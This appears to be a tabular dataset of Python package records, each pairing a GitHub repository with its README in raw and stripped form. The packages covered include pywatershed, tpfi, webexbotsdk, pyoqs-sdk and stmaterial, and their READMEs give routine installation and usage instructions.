  * Use cutting-edge techniques and technologies to improve models
  * Machine learning, automatic differentiation
  * Address challenges of modeling across space and time scales
  * Transition prototype watershed model to compiled EC code


Installation and Python Environments
=====================================
This installation assumes you do not need to run automated tests locally. See
the following ""Developer Installation"" section for complete installation
instructions.

To install the software you will need Python >= 3.8. We recommend installing
the python package dependencies using anaconda or miniconda. Most users will
likely want to create the `pyws_nb` conda environment by running

```conda env create -f examples/examples_env.yml```.

One could also do

```pip install -r examples/exampes_env.txt```

but this is not guaranteed.

Once the environment is established, activate the environment and install
pywatershed

`conda activate pyws_nb; cd pywatershed; pip install .`

If you would like to compile the fortran computational kernels for
certain physical process representations (not required), you'll need a fortran
compiler and you will run

`export PYWS_FORTRAN=true; cd pywatershed;  pip install .`

See Developer Requirements below for more details.


Developer Installation
=======================
Git is required if you plan to contribute code back to the repository.

C and Fortran compilers are required. We are currently using gnu (gcc, gfortran)
11 and 12 as well as intel (icc, ifort) 2021 on Windows, Linux, and MacOS
(including Apple Silicon). Both of these are freely obtainable but the installation
process varies widely. We are looking for a conda-based approach to obtaining
compilers, but currently do not have a solution. Compilers are needed for
two applications:

  1. Compiling and running C/Fortran PRMS code to generate testing/verification data
  2. Compiling (installing) and running fortran backends/kernels for some hydrological
     process representations in pywatershed

On Apple Silicon, the PRMS source code is only currently known to compile with intel while
the fortran kernels in pywatershed only compile with gnu.

Python >= 3.8 is required. Three different python environments are specified within the repository.
These are:

* Minimal (for developing/testing), 'pyws': ci/requirements/environment.yml
* Notebooks (~= minimal + jupyter), 'pyws_nb': examples/examples_env.yml
* Documentation (only if you want to build the documentation), 'pyws-docs': ci/requirements/doc.yml

We recommend (because we test it in CI) using anacoda or miniconda to establish these environments
with the following commands

```conda env create -f path/to/env_of_choice.yml```

which will create the environment with ""name"" specified on the first line of the file, given before the path
to the file above.

More detailed python environment installation instructions using conda can be found in
`examples/00_python_virtual_env.ipynb`.

There are also .txt equivalents that can be used for installing from pip, like so:

```pip install -r env_of_choice.txt```

though these are not comprehensive installs as with conda and not tested.

Once the python environment and dependencies are established and activated (`conda activate env_of_choice`),
pywatershed is installed for development into that environment with the following command

`cd pywatershed; pip install -e .`

The numpy extension F2PY is used to provide fortran compiled kernels of core calculations to boost
performance. F2PY is documented [within numpy](https://numpy.org/doc/stable/f2py/index.html). This
repository is configured NOT to compile on install by default. Currently, we have not established
this compilation procedure for Windows. On linux and MacOS, compilation of fortran kernels on package
installation is achieved by the following code:

```
export SETUPTOOLS_ENABLE_FEATURES=""legacy-editable""
export CC=path/to/gcc  # for example
export FC=path/to/gfortran  # for example
export PYWS_FORTRAN=true
cd path/to/pywatershed
pip install -e .
```

Once the dependencies are available, we want to verify the software by running its test suite. The
following testing procedures are also covered in the notebook `examples/01_automated_testing.ipynb`.
To run the tests, we first need to generate the test data. This consists of running PRMS
and then converting the output to netcdf:

```
cd path/to/pywatershed/test_data/scripts
pytest -v -n=4 test_run_domains.py
pytest -v -n=8 test_nc_domains.py
```

Finally, run the tests themselves,

```
cd path/to/pywatershed/autotest
pytest -v -n=8
```

All tests should pass, XPASS, or XFAIL. XFAIL is an expected failure.


Contributing
============
We welcome community development! Please file Issues and/or Pull Requests in the appropriate places on github. The continuous
integration (CI) procedure is the first gate keeper for new code contribution. The CI procedure is defined by
`.github/workflows/ci.yaml`. This includes running the formatting and linting packages `isort`, `black`, and
`flake8` in addition to generating the test data and running the tests in `autotest/`. New codes need new tests so they can
be verified moving ahead in time.


Example Notebooks
==================
Jupyter notebooks containing examples are found in the
[examples/](https://github.com/EC-USGS/pywatershed/tree/main/examples) directory. Numbered notebooks are tested.
Notebooks 00 and 01 walk the user through the setting the python environment and running the software tests.
Notebook 02 demonstrates modeling with pywatershed. Non-numbered notebooks cover additional topics. These notebooks
are note yet covered by testing and so may be expected to have some issues until they are added to testing.


Overview of Repository Contents
==========
The contents of directories at this level is described. Therein you may discover another README.md for more information.

```
.github/    Github actions for deploying continuous integration (CI)
autotest/   pywatershed package testing using pytest
bin/        PRMS executables distributed
ci/         Python environments for CI
doc/        Package/code documentation source code
examples/   How to use the package, mostly jupyter notebooks
prms_src/   PRMS source used for generating executables in bin/
pywatershed/      Package source
reference/  Ancillary materials for development
resources/  Static stuff like images
test_data/  Data used for automated testing
```


Disclaimer
==========

This information is preliminary or provisional and is subject to revision. It is being provided to meet the need for timely best science. The information has not received final approval by the U.S. Geological Survey (USGS) and is provided on the condition that neither the USGS nor the U.S. Government shall be held liable for any damages resulting from the authorized or unauthorized use of the information.

From: https://www2.usgs.gov/fsp/fsp_disclaimers.asp#5

This software is in the public domain because it contains materials that originally came from the U.S. Geological Survey, an agency of the United States Department of Interior. For more information, see the [official USGS copyright policy](https://www.usgs.gov/information-policies-and-instructions/copyrights-and-credits ""official USGS copyright policy"")

Although this software program has been used by the USGS, no warranty, expressed or implied, is made by the USGS or the U.S. Government as to the accuracy and functioning of the program and related program material nor shall the fact of distribution constitute any such warranty, and no responsibility is assumed by the USGS in connection therewith.
This software is provided ""AS IS.""
",ec-usgs/pywatershed
aeropython,https://github.com/koentjess/AeroPython,0,0,0,,,koentjess/aeropython
kordigits,https://github.com/jukyung-j/Korean_numeral,3,0,0,,,jukyung-j/korean_numeral
pytedea,https://github.com/advancehs/pytedea,0,411,411,"# pytedea


[![image](https://img.shields.io/pypi/v/pytedea.svg)](https://pypi.python.org/pypi/pytedea)
[![image](https://img.shields.io/conda/vn/conda-forge/pytedea.svg)](https://anaconda.org/conda-forge/pytedea)


**Data envelopment analysis using Python.**


-   Free software: GNU General Public License v3
-   Documentation: https://advancehs.github.io/pytedea
    

## Features

-   TODO
","# pytedea


[![image](https://img.shields.io/pypi/v/pytedea.svg)](https://pypi.python.org/pypi/pytedea)
[![image](https://img.shields.io/conda/vn/conda-forge/pytedea.svg)](https://anaconda.org/conda-forge/pytedea)


**Data envelopment analysis using Python.**


-   Free software: GNU General Public License v3
-   Documentation: https://advancehs.github.io/pytedea
    

## Features

-   TODO
",advancehs/pytedea
tpfi,https://github.com/keyuxing/tpfi,1,2252,2252,"# tpfi
[![PyPI version](https://badge.fury.io/py/tpfi.svg)](https://badge.fury.io/py/tpfi)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

`tpfi` is an easy-to-use visualization tool for astronomers to identify and analyze 
stars in the Kepler, K2, and TESS missions. The main focus of this project is on 
two functions: `plot_identification` and `plot_season`. These functions create 
plots to help visualize target stars and their surrounding environments.

---

**Plot identification charts for Kepler, K2 and TESS.**

![alt text](https://raw.githubusercontent.com/keyuxing/tpfi/main/examples/kepler.png)

![alt text](https://raw.githubusercontent.com/keyuxing/tpfi/main/examples/k2.png)

![alt text](https://raw.githubusercontent.com/keyuxing/tpfi/main/examples/tess.png)

The `plot_identification` function creates identification charts, which are useful 
for determining if a target is contaminated by nearby stars. In each chart, the 
right panel displays the target (marked by a cross symbol) and nearby stars. The 
circle size indicates their relative brightness. The left panel displays the same 
sky coverage but from the [DSS2 Red survey](https://skyview.gsfc.nasa.gov/current/cgi/moreinfo.pl?survey=DSS2%20Red).

This function is revised based on 
[_tpfplotter_](https://github.com/jlillo/tpfplotter). 

---

**Plot season charts for Kepler targets.**

![alt text](https://raw.githubusercontent.com/keyuxing/tpfi/main/examples/season.png)

The `plot_season` function creates a plot of the TPF for each season of the Kepler 
mission for a given target star. Note that this function is only applicable for 
Kepler targets.

## Installation

You can install this package using `pip`:
```shell
pip install tpfi
```

## How to use

See the [example notebook](https://github.com/keyuxing/tpfi/blob/main/examples/tutorial.ipynb) for more details.

## Contributing

If you would like to contribute to this project, feel free to submit a pull request 
or open an issue on GitHub. Any suggestion, improvement, or bug report is welcomed.

## License

This project is licensed under the MIT License - see the 
[LICENSE](https://github.com/keyuxing/tpfi/blob/main/LICENSE) file for details.
","# tpfi
[![PyPI version](https://badge.fury.io/py/tpfi.svg)](https://badge.fury.io/py/tpfi)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

`tpfi` is an easy-to-use visualization tool for astronomers to identify and analyze 
stars in the Kepler, K2, and TESS missions. The main focus of this project is on 
two functions: `plot_identification` and `plot_season`. These functions create 
plots to help visualize target stars and their surrounding environments.

---

**Plot identification charts for Kepler, K2 and TESS.**

![alt text](https://raw.githubusercontent.com/keyuxing/tpfi/main/examples/kepler.png)

![alt text](https://raw.githubusercontent.com/keyuxing/tpfi/main/examples/k2.png)

![alt text](https://raw.githubusercontent.com/keyuxing/tpfi/main/examples/tess.png)

The `plot_identification` function creates identification charts, which are useful 
for determining if a target is contaminated by nearby stars. In each chart, the 
right panel displays the target (marked by a cross symbol) and nearby stars. The 
circle size indicates their relative brightness. The left panel displays the same 
sky coverage but from the [DSS2 Red survey](https://skyview.gsfc.nasa.gov/current/cgi/moreinfo.pl?survey=DSS2%20Red).

This function is revised based on 
[_tpfplotter_](https://github.com/jlillo/tpfplotter). 

---

**Plot season charts for Kepler targets.**

![alt text](https://raw.githubusercontent.com/keyuxing/tpfi/main/examples/season.png)

The `plot_season` function creates a plot of the TPF for each season of the Kepler 
mission for a given target star. Note that this function is only applicable for 
Kepler targets.

## Installation

You can install this package using `pip`:
```shell
pip install tpfi
```

## How to use

See the [example notebook](https://github.com/keyuxing/tpfi/blob/main/examples/tutorial.ipynb) for more details.

## Contributing

If you would like to contribute to this project, feel free to submit a pull request 
or open an issue on GitHub. Any suggestion, improvement, or bug report is welcomed.

## License

This project is licensed under the MIT License - see the 
[LICENSE](https://github.com/keyuxing/tpfi/blob/main/LICENSE) file for details.
",keyuxing/tpfi
xpi2pkgbuild,https://github.com/perigoso/xpi2pkgbuild,0,76,76,"# xpi2pkgbuild
Mozilla XPI based PKGBUILD generator using mozilla addon API
","# xpi2pkgbuild
Mozilla XPI based PKGBUILD generator using mozilla addon API
",perigoso/xpi2pkgbuild
webexbotsdk,https://github.com/xharriscisco/WebexPythonBotSDK,5,5821,5612,"webex bot creation framework and tools via `pip install webexbotsdk`

[![PyPI](https://img.shields.io/pypi/v/webexbotsdk)](https://pypi.org/project/webexbotsdk/)
[![PyPI - License](https://img.shields.io/pypi/l/webexbotsdk)](https://github.com/xharriscisco/WebexPythonBotSDK/blob/main/LICENSE)

##### <a id='toc'></a> [webexbotsdk](https://pypi.org/project/webexteamssdk/)

- [teams](#teams)
- [util](#util)
- [tinydb](#tinydb)

##### [Contributing](#contributing)

<br/>

## <a id='teams'></a> `webexbotsdk.teams`

###### [#EG](#teams-eg) | [#API](#teams-api) | A framework for creating a Webex Teams bot

<br/>

### <a id='teams-eg'></a> [^](#toc) EG

---

##### configure with **config.json**

```js
{
  ""botAccessToken"": """",   // (required) create a bot at https://developer.webex.com/my-apps
  ""port"": 8080,           // local server port
  ""botName"": """",          // give it a unique identifier (ex. mybot)
  ""encryptDb"": false,     // encrypts local json db
  ""botDbKey"": """",         // key used when 'encryptDb' is true
  ""ngrokAuthToken"": """",   // not recommended unless using a paid tier
  ""disableDb"": false      // disable tinydb
}
```

##### quick start

```py
from webexbotsdk.teams import Bot

bot = Bot()

@bot.hears(r'hi|hello')
def hears_hi(message, data):
  person = bot.api.people.get(message.personId)
  return bot.api.messages.create(
    roomId = message.roomId,
    text = f""Hi {person.displayName}""
  )

bot.setup('config.json')
bot.run()
```

##### with class inheritence

```python
from webexbotsdk.teams import Bot, sdk

class HiBot(Bot):
  def say_hi(self, replyTo: sdk.Message) -> sdk.Message:
    person:sdk.Person = self.api.people.get(replyTo.personId)
    return self.api.messages.create(
      roomId=replyTo.roomId,
      text=f""Hi {person.displayName}""
    )

hibot = HiBot()

@hibot.hears(r'hi|hello')
def hears_hi(message:sdk.Message, data):
  hibot.say_hi(message)

hibot.setup('config.json')
hibot.run()
```

##### [webexteamssdk](https://webexteamssdk.readthedocs.io/en/latest/) is included

```python
from webexbotsdk.teams import Bot
bot = Bot()
all_rooms = api.rooms.list()
demo_rooms = [room for room in all_rooms if 'webexteamssdk Demo' in room.title]
```

##### local DB with [TinyDB](https://tinydb.readthedocs.io/en/latest/index.html) to remember things even after the bot is restarted

```python
from webexbotsdk.teams import Bot
from webexbotsdk.tinydb import where

bot = Bot()

@bot.hears(r'remember (\d+)')
def hears_remember(message, data):
  number = int(data['groups'][0][0])
  bot.db.table('stuff').upsert(
    { 'personId':message.personId, 'number':number },
    (where('personId') == message.personId) & (where('number') == number)
  )

@bot.hears('recall')
def hears_recall(message, data):
  docs = bot.db.table('stuff').search(where('personId') == message.personId)
  bot.api.messages.create(
    roomId=message.roomId,
    text=f""I remember {', '.join([str(doc['number']) for doc in docs])}"" if len(docs) > 0
    else 'No numbers stored yet'
  )

bot.setup('config.json')
bot.run()
```

##### use dataclasses to type check DB documents

```python
from webexbotsdk.teams import Bot
from webexbotsdk.tinydb import where, dataclass, BotDoc

bot = Bot()

@dataclass
class Number(BotDoc):
  personId:str
  number:int

doc_id = bot.db.table('stuff').insert(Number(personId='asdf', number=14).dict())
docs = [Number(**doc) for doc in bot.db.table('stuff').get(doc_id=doc_id)]

bot.setup('config.json')
bot.run()
```

<br/>

### <a id='teams-api'></a> [^](#toc) API

---

**class Bot**

###### props

`app` [Bottle](https://bottlepy.org/docs/dev/) local server for teams webhooks

`api` [WebexTeamsAPI](https://webexteamssdk.readthedocs.io/en/latest/) will be abbreviated as `teams` in this doc

`db` [TinyDB](https://tinydb.readthedocs.io/en/latest/index.html)

`log` python 3 [Logger](https://docs.python.org/3/library/logging.html)

###### methods

```python
setup(config:dict)
setup(path:str)
```

> configure Bot using a python dict or a filepath to a json config

```python
table(name:str) -> TinyDB.Table
```

> retrieve [tinydb table](https://tinydb.readthedocs.io/en/latest/usage.html#tables)

```python
run()
```

> start the bot local server

```python
send_card(roomId:str, card:teams.AdaptiveCard) -> teams.Message
```

> [AdaptiveCard Components](https://webexteamssdk.readthedocs.io/en/latest/user/api.html#cards-and-buttons)

```python
mention(person:teams.Person|teams.Membership) -> str
mention(personId:str, displayName:str) -> str
```

> (BROKEN) returns a formatted string for mentioning a user in a message
>
> `bot.api.message.create(text = f""hello {bot.mention(person)}"")`

```python
send_help(source:teams.Message) -> teams.Message
```

> reply to a message with help text which includes
>
> - commands the bot recognizes
> - command descriptions

```python
hears(regex:str|list[str]|Pattern, name:str=None, description:str=None)
```

> @decorator, listen for user giving the bot with a command

```python
on(resource:str, event:str = None)
```

> @decorator, listen for other resource events

<br/>
<br/>

## <a id='util'></a> `webexbotsdk.util`

###### [#API](#util-api) | Framework helper methods

<br/>

### <a id='util-api'></a> [^](#toc) API

---

###### methods

```python
is_bot(person:teams.Person|teams.Membership) -> bool
```

> determine whether a person is a human or bot

<br/>
<br/>

## <a id='tinydb'></a> `webexbotsdk.tinydb`

###### [^TOC](#toc) | [@DOCS](https://tinydb.readthedocs.io/en/latest/) | TinyDB library

<br/>
<br/>

## <a id='contributing'></a> Contributing

Create an [Issue](https://github.com/xharriscisco/WebexPythonBotSDK/issues) to:

1. Ask a question
2. Request a feature
3. Report a bug
4. ~~File a complaint~~

Pull requests from branches/forks are also welcome! I will try to respond to them ASAP.
","webex bot creation framework and tools via `pip install webexbotsdk`

[![PyPI](https://img.shields.io/pypi/v/webexbotsdk)](https://pypi.org/project/webexbotsdk/)
[![PyPI - License](https://img.shields.io/pypi/l/webexbotsdk)](https://github.com/xharriscisco/WebexPythonBotSDK/blob/main/LICENSE)

#####  [webexbotsdk](https://pypi.org/project/webexteamssdk/)

- [teams](#teams)
- [util](#util)
- [tinydb](#tinydb)

##### [Contributing](#contributing)



##  `webexbotsdk.teams`

###### [#EG](#teams-eg) | [#API](#teams-api) | A framework for creating a Webex Teams bot



###  [^](#toc) EG

---

##### configure with **config.json**

```js
{
  ""botAccessToken"": """",   // (required) create a bot at https://developer.webex.com/my-apps
  ""port"": 8080,           // local server port
  ""botName"": """",          // give it a unique identifier (ex. mybot)
  ""encryptDb"": false,     // encrypts local json db
  ""botDbKey"": """",         // key used when 'encryptDb' is true
  ""ngrokAuthToken"": """",   // not recommended unless using a paid tier
  ""disableDb"": false      // disable tinydb
}
```

##### quick start

```py
from webexbotsdk.teams import Bot

bot = Bot()

@bot.hears(r'hi|hello')
def hears_hi(message, data):
  person = bot.api.people.get(message.personId)
  return bot.api.messages.create(
    roomId = message.roomId,
    text = f""Hi {person.displayName}""
  )

bot.setup('config.json')
bot.run()
```

##### with class inheritence

```python
from webexbotsdk.teams import Bot, sdk

class HiBot(Bot):
  def say_hi(self, replyTo: sdk.Message) -> sdk.Message:
    person:sdk.Person = self.api.people.get(replyTo.personId)
    return self.api.messages.create(
      roomId=replyTo.roomId,
      text=f""Hi {person.displayName}""
    )

hibot = HiBot()

@hibot.hears(r'hi|hello')
def hears_hi(message:sdk.Message, data):
  hibot.say_hi(message)

hibot.setup('config.json')
hibot.run()
```

##### [webexteamssdk](https://webexteamssdk.readthedocs.io/en/latest/) is included

```python
from webexbotsdk.teams import Bot
bot = Bot()
all_rooms = api.rooms.list()
demo_rooms = [room for room in all_rooms if 'webexteamssdk Demo' in room.title]
```

##### local DB with [TinyDB](https://tinydb.readthedocs.io/en/latest/index.html) to remember things even after the bot is restarted

```python
from webexbotsdk.teams import Bot
from webexbotsdk.tinydb import where

bot = Bot()

@bot.hears(r'remember (\d+)')
def hears_remember(message, data):
  number = int(data['groups'][0][0])
  bot.db.table('stuff').upsert(
    { 'personId':message.personId, 'number':number },
    (where('personId') == message.personId) & (where('number') == number)
  )

@bot.hears('recall')
def hears_recall(message, data):
  docs = bot.db.table('stuff').search(where('personId') == message.personId)
  bot.api.messages.create(
    roomId=message.roomId,
    text=f""I remember {', '.join([str(doc['number']) for doc in docs])}"" if len(docs) > 0
    else 'No numbers stored yet'
  )

bot.setup('config.json')
bot.run()
```

##### use dataclasses to type check DB documents

```python
from webexbotsdk.teams import Bot
from webexbotsdk.tinydb import where, dataclass, BotDoc

bot = Bot()

@dataclass
class Number(BotDoc):
  personId:str
  number:int

doc_id = bot.db.table('stuff').insert(Number(personId='asdf', number=14).dict())
docs = [Number(**doc) for doc in bot.db.table('stuff').get(doc_id=doc_id)]

bot.setup('config.json')
bot.run()
```



###  [^](#toc) API

---

**class Bot**

###### props

`app` [Bottle](https://bottlepy.org/docs/dev/) local server for teams webhooks

`api` [WebexTeamsAPI](https://webexteamssdk.readthedocs.io/en/latest/) will be abbreviated as `teams` in this doc

`db` [TinyDB](https://tinydb.readthedocs.io/en/latest/index.html)

`log` python 3 [Logger](https://docs.python.org/3/library/logging.html)

###### methods

```python
setup(config:dict)
setup(path:str)
```

> configure Bot using a python dict or a filepath to a json config

```python
table(name:str) -> TinyDB.Table
```

> retrieve [tinydb table](https://tinydb.readthedocs.io/en/latest/usage.html#tables)

```python
run()
```

> start the bot local server

```python
send_card(roomId:str, card:teams.AdaptiveCard) -> teams.Message
```

> [AdaptiveCard Components](https://webexteamssdk.readthedocs.io/en/latest/user/api.html#cards-and-buttons)

```python
mention(person:teams.Person|teams.Membership) -> str
mention(personId:str, displayName:str) -> str
```

> (BROKEN) returns a formatted string for mentioning a user in a message
>
> `bot.api.message.create(text = f""hello {bot.mention(person)}"")`

```python
send_help(source:teams.Message) -> teams.Message
```

> reply to a message with help text which includes
>
> - commands the bot recognizes
> - command descriptions

```python
hears(regex:str|list[str]|Pattern, name:str=None, description:str=None)
```

> @decorator, listen for user giving the bot with a command

```python
on(resource:str, event:str = None)
```

> @decorator, listen for other resource events




##  `webexbotsdk.util`

###### [#API](#util-api) | Framework helper methods



###  [^](#toc) API

---

###### methods

```python
is_bot(person:teams.Person|teams.Membership) -> bool
```

> determine whether a person is a human or bot




##  `webexbotsdk.tinydb`

###### [^TOC](#toc) | [@DOCS](https://tinydb.readthedocs.io/en/latest/) | TinyDB library




##  Contributing

Create an [Issue](https://github.com/xharriscisco/WebexPythonBotSDK/issues) to:

1. Ask a question
2. Request a feature
3. Report a bug
4. ~~File a complaint~~

Pull requests from branches/forks are also welcome! I will try to respond to them ASAP.
",xharriscisco/webexpythonbotsdk
java-test-genie,https://github.com/boraelci/java-test-genie,0,0,0,,,boraelci/java-test-genie
spectresc,https://github.com/cylammarco/SpectResC,1,1473,1473,"# SpectResC
[![Coverage Status](https://coveralls.io/repos/github/cylammarco/SpectResC/badge.svg?branch=main)](https://coveralls.io/github/cylammarco/SpectResC?branch=main)
[![Readthedocs Status](https://readthedocs.org/projects/spectres/badge/?version=latest&style=flat)](https://spectres.readthedocs.io)
[![arXiv](https://img.shields.io/badge/arXiv-1705.05165-00ff00.svg)](https://arxiv.org/abs/1705.05165)
[![PyPI version](https://badge.fury.io/py/spectresc.svg)](https://badge.fury.io/py/spectresc)
[![DOI](https://zenodo.org/badge/DOI/10.5281/zenodo.7863171.svg)](https://doi.org/10.5281/zenodo.7863171)

This is a Python package written with C extension to provide significant performance gain on [SpectRes](https://github.com/ACCarnall/SpectRes), and some performance over the numba implementation:

![alt text](https://github.com/cylammarco/SpectResC/blob/main/speed_test/speed_test.png?raw=true)

We keep the implementation as close to SpectRes as possible. As of SpectRes v2.2.0, we do not see discrepant results between using SpectRes and SpectReC.

## Installation

SpectResC can be installed using pip

```
pip install spectresc
```

## Documentation

Please refer to the original SpectRes for the [documentation](https://spectres.readthedocs.io).

## Citation

If you have made use of SpectResC, please reference:

1. the original SpectRes [arXiv article](https://arxiv.org/abs/1705.05165)
2. the [zenodo DOI](https://zenodo.org/record/7863171) for SpectResC
","# SpectResC
[![Coverage Status](https://coveralls.io/repos/github/cylammarco/SpectResC/badge.svg?branch=main)](https://coveralls.io/github/cylammarco/SpectResC?branch=main)
[![Readthedocs Status](https://readthedocs.org/projects/spectres/badge/?version=latest&style=flat)](https://spectres.readthedocs.io)
[![arXiv](https://img.shields.io/badge/arXiv-1705.05165-00ff00.svg)](https://arxiv.org/abs/1705.05165)
[![PyPI version](https://badge.fury.io/py/spectresc.svg)](https://badge.fury.io/py/spectresc)
[![DOI](https://zenodo.org/badge/DOI/10.5281/zenodo.7863171.svg)](https://doi.org/10.5281/zenodo.7863171)

This is a Python package written with C extension to provide significant performance gain on [SpectRes](https://github.com/ACCarnall/SpectRes), and some performance over the numba implementation:

![alt text](https://github.com/cylammarco/SpectResC/blob/main/speed_test/speed_test.png?raw=true)

We keep the implementation as close to SpectRes as possible. As of SpectRes v2.2.0, we do not see discrepant results between using SpectRes and SpectReC.

## Installation

SpectResC can be installed using pip

```
pip install spectresc
```

## Documentation

Please refer to the original SpectRes for the [documentation](https://spectres.readthedocs.io).

## Citation

If you have made use of SpectResC, please reference:

1. the original SpectRes [arXiv article](https://arxiv.org/abs/1705.05165)
2. the [zenodo DOI](https://zenodo.org/record/7863171) for SpectResC
",cylammarco/spectresc
pyoqs-sdk,https://github.com/sagarbhure/pyoqs_sdk,0,3517,3505,"
# Quantum-Proof Security with pyoqs_sdk in Python 

[![Build status](https://www.python.org/static/community_logos/python-logo.png)](https://pypi.org/project/pyoqs-sdk/)

[![Build status](https://ci.appveyor.com/api/projects/status/jjo1ti9l5e0grgln?svg=true)](https://github.com/sagarbhure/pyoqs_sdk/releases/tag/v2.0) ![Python](https://img.shields.io/badge/python-v3.6+-blue.svg)  ![Dependencies](https://img.shields.io/badge/dependencies-up%20to%20date-brightgreen.svg)  ![Contributions welcome](https://img.shields.io/badge/contributions-welcome-orange.svg)  ![License](https://img.shields.io/badge/license-MIT-blue.svg)

pyoqs_sdk PyPi : https://pypi.org/project/pyoqs-sdk/

The Open Quantum Safe (OQS) project has the goal of developing and prototyping quantum-resistant cryptography.
liboqs is an open source C library for quantum-resistant cryptographic algorithms. See more about liboqs at https://github.com/open-quantum-safe/liboqs/, including a list of supported algorithms.



pyoqs_sdk is an open-source Python 3 library that wraps the liboqs C library. It offers a unified API for post-quantum key encapsulation and digital signature schemes, as well as a collection of open-source implementations of post-quantum cryptography algorithms. 

The OQS project also includes prototype integrations into various application-level protocols to test the effectiveness of quantum-resistant cryptography. For more information, visit https://openquantumsafe.org/
## Pre-requisite
Python 3.x pyoqs_sdk depends on the liboqs C library; liboqs must first be compiled as a Linux/macOS/Windows library.
## Contents 

This Project contains following Contents

- `pyoqs_sdk/pyoqs_sdk.py`: a Python 3 module wrapper for the liboqs C library.
- `pyoqs_sdk/rand.py`: a Python 3 module supporting RNGs from <oqs/rand.h>
- `test`: unit test to be added



## Installation

This project is on [PyPI](https://pypi.org/project/pyoqs-sdk/) and can be installed with

```
pip install pyoqs_sdk
```


First, you must build liboqs according to the liboqs building instructions with shared library support enabled (add `-DBUILD_SHARED_LIBS=ON` to the cmake command), followed (optionally) by a sudo ninja install to ensure that the shared library is visible system-wide (by default it installs under `/usr/local/include` and `/usr/local/lib` on Linux/macOS).

On Linux/macOS you may need to set the `LD_LIBRARY_PATH` (`DYLD_LIBRARY_PATH` on macOS) environment variable to point to the path to liboqs' library directory, e.g.
```
export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/usr/local/lib
```

Alternatively, you can install it from this repository directly:

```
git clone https://github.com/sagarbhure/pyoqs_sdk
cd pyoqs_sdk
python3 setup.py install
```


## Running Tests [In-progress]



To run the unit tests without a test runner:
```
python3 tests/test_kem.py
python3 tests/test_sig.py
```

## Usage

The pyoqs_sdk library offers two main classes, KeyEncapsulation and Signature, for implementing post-quantum key encapsulation and signature mechanisms. To use these classes, you must instantiate them with a string that identifies one of the mechanisms supported by liboqs.

You can use the get_enabled_KEM_mechanisms() and get_enabled_sig_mechanisms() functions to enumerate the available options. The examples in the examples/ directory show how to use the library's API. Additionally, the library supports alternative RNGs through the randombytes[] functions.
## Authors

- [@sagarbhure](https://www.github.com/sagarbhure)



","
# Quantum-Proof Security with pyoqs_sdk in Python 

[![Build status](https://www.python.org/static/community_logos/python-logo.png)](https://pypi.org/project/pyoqs-sdk/)

[![Build status](https://ci.appveyor.com/api/projects/status/jjo1ti9l5e0grgln?svg=true)](https://github.com/sagarbhure/pyoqs_sdk/releases/tag/v2.0) ![Python](https://img.shields.io/badge/python-v3.6+-blue.svg)  ![Dependencies](https://img.shields.io/badge/dependencies-up%20to%20date-brightgreen.svg)  ![Contributions welcome](https://img.shields.io/badge/contributions-welcome-orange.svg)  ![License](https://img.shields.io/badge/license-MIT-blue.svg)

pyoqs_sdk PyPi : https://pypi.org/project/pyoqs-sdk/

The Open Quantum Safe (OQS) project has the goal of developing and prototyping quantum-resistant cryptography.
liboqs is an open source C library for quantum-resistant cryptographic algorithms. See more about liboqs at https://github.com/open-quantum-safe/liboqs/, including a list of supported algorithms.



pyoqs_sdk is an open-source Python 3 library that wraps the liboqs C library. It offers a unified API for post-quantum key encapsulation and digital signature schemes, as well as a collection of open-source implementations of post-quantum cryptography algorithms. 

The OQS project also includes prototype integrations into various application-level protocols to test the effectiveness of quantum-resistant cryptography. For more information, visit https://openquantumsafe.org/
## Pre-requisite
Python 3.x pyoqs_sdk depends on the liboqs C library; liboqs must first be compiled as a Linux/macOS/Windows library.
## Contents 

This Project contains following Contents

- `pyoqs_sdk/pyoqs_sdk.py`: a Python 3 module wrapper for the liboqs C library.
- `pyoqs_sdk/rand.py`: a Python 3 module supporting RNGs from 
- `test`: unit test to be added



## Installation

This project is on [PyPI](https://pypi.org/project/pyoqs-sdk/) and can be installed with

```
pip install pyoqs_sdk
```


First, you must build liboqs according to the liboqs building instructions with shared library support enabled (add `-DBUILD_SHARED_LIBS=ON` to the cmake command), followed (optionally) by a sudo ninja install to ensure that the shared library is visible system-wide (by default it installs under `/usr/local/include` and `/usr/local/lib` on Linux/macOS).

On Linux/macOS you may need to set the `LD_LIBRARY_PATH` (`DYLD_LIBRARY_PATH` on macOS) environment variable to point to the path to liboqs' library directory, e.g.
```
export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/usr/local/lib
```

Alternatively, you can install it from this repository directly:

```
git clone https://github.com/sagarbhure/pyoqs_sdk
cd pyoqs_sdk
python3 setup.py install
```


## Running Tests [In-progress]



To run the unit tests without a test runner:
```
python3 tests/test_kem.py
python3 tests/test_sig.py
```

## Usage

The pyoqs_sdk library offers two main classes, KeyEncapsulation and Signature, for implementing post-quantum key encapsulation and signature mechanisms. To use these classes, you must instantiate them with a string that identifies one of the mechanisms supported by liboqs.

You can use the get_enabled_KEM_mechanisms() and get_enabled_sig_mechanisms() functions to enumerate the available options. The examples in the examples/ directory show how to use the library's API. Additionally, the library supports alternative RNGs through the randombytes[] functions.
## Authors

- [@sagarbhure](https://www.github.com/sagarbhure)



",sagarbhure/pyoqs_sdk
stmaterial,https://github.com/zclab/stmaterial,5,841,722,"<h1 align=""center"">
  <img src=""docs/_static/logo.png"" width=""400"">
</h1>

[![deploy](https://github.com/zclab/stmaterial/actions/workflows/deploy-docs.yml/badge.svg)](https://zclab.github.io/stmaterial/)
[![release](https://img.shields.io/github/release/zclab/stmaterial.svg)](https://github.com/zclab/stmaterial/releases)


A Materialize based sphinx theme


## Installation and usage

<!-- start quickstart -->

To use this theme in the repository, follow these steps:

1. Install the `stmaterial` in your doc build environment:
   
    ```
    pip install -i https://test.pypi.org/simple/ stmaterial
    ```

2. Configure the Sphinx docs to use the theme by editing `conf.py`

    ```python
    html_theme = ""stmaterial""
    ```

3. Your Sphinx documentation's HTML pages will now be generated with this theme! 🎉

<!-- end quickstart -->","



[![deploy](https://github.com/zclab/stmaterial/actions/workflows/deploy-docs.yml/badge.svg)](https://zclab.github.io/stmaterial/)
[![release](https://img.shields.io/github/release/zclab/stmaterial.svg)](https://github.com/zclab/stmaterial/releases)


A Materialize based sphinx theme


## Installation and usage



To use this theme in the repository, follow these steps:

1. Install the `stmaterial` in your doc build environment:
   
    ```
    pip install -i https://test.pypi.org/simple/ stmaterial
    ```

